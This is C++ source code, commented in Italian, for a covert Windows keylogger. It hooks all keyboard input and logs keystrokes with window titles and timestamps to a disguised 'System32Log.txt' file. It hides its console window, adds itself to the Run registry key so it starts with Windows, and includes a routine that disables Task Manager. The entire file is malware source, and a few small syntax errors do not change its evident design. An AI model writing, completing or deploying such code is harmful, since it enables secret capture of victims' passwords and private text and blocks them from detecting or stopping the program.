#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include <string>
#define WM_CLOSE
using namespace std;


//questo programma è facilmente individuabile dagli antivirus :)

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE;

extern char lastwindow[256];

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
		
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			
			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{

	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    char lastwindow[256];
    
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks
	
	HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;
    if (foreground) {
        //get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);
        
        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);
            
            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);
            
            OUTPUT_FILE << "\n\n[Window: "<< window_title << " - at " << s << "] ";
        }
    }


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
        OUTPUT_FILE << "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		OUTPUT_FILE <<  "\n";
	else if (key_stroke == VK_SPACE)
		OUTPUT_FILE << " ";
	else if (key_stroke == VK_TAB)
		OUTPUT_FILE << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		OUTPUT_FILE << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		OUTPUT_FILE << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		OUTPUT_FILE << "[ESCAPE]";
	else if (key_stroke == VK_END)
		OUTPUT_FILE << "[END]";
	else if (key_stroke == VK_HOME)
		OUTPUT_FILE << "[HOME]";
	else if (key_stroke == VK_LEFT)
		OUTPUT_FILE << "[LEFT]";
	else if (key_stroke == VK_UP)
		OUTPUT_FILE << "[UP]";
	else if (key_stroke == VK_RIGHT)
		OUTPUT_FILE << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		OUTPUT_FILE << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		OUTPUT_FILE << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		OUTPUT_FILE << "-";
	else if (key_stroke == 20)
		OUTPUT_FILE << "[CAPSLOCK]";
	else {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;   
        }

        //map virtual key according to keyboard layout 
        key = MapVirtualKeyExA(key_stroke,MAPVK_VK_TO_CHAR, layout);
        
        //tolower converts it to lowercase properly
        if (!lowercase) key = tolower(key);
		OUTPUT_FILE <<  char(key);
    }
	//instead of opening and closing file handlers every time, keep file open and flush.
    OUTPUT_FILE.flush();
	return 0;
}
string risposta;
void richiesta()
{
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisibile
}

void avvio()
{
HKEY hKey;
const char* czStartName = "MyApplication";
const char* czExePath   = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";

LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0 , KEY_WRITE,
                            &hKey);
if( ERROR_SUCCESS == lnRes )
{
    lnRes = RegSetValueEx(  hKey,
                            czStartName,
                            0,
                            REG_SZ,
                            (unsigned char*)czExePath,
                            strlen(czExePath) );
}

RegCloseKey(hKey);
}
void disableTaskmgr()
{
   HKEY regHandle;
   DWORD dwValue = 1;
   BYTE* data = (BYTE*)&dwValue;
   RegCreateKeyEx(HKEY_CURRENT_USER ,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY,NULL , &regHandle ,NULL );
   RegSetValueEx(regHandle,"DisableTaskmgr",0, REG_DWORD,data ,sizeof(DWORD));
   RegCloseKey(regHandle);
}
int main()
{
	//open 
    OUTPUT_FILE.open("System32Log.txt",std::ios_base::app);	

richiesta();	

	SetHook();
	avvio();
	
	disableTaskmgr//molto molto pericolosa

	// loop 
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
{
}
}


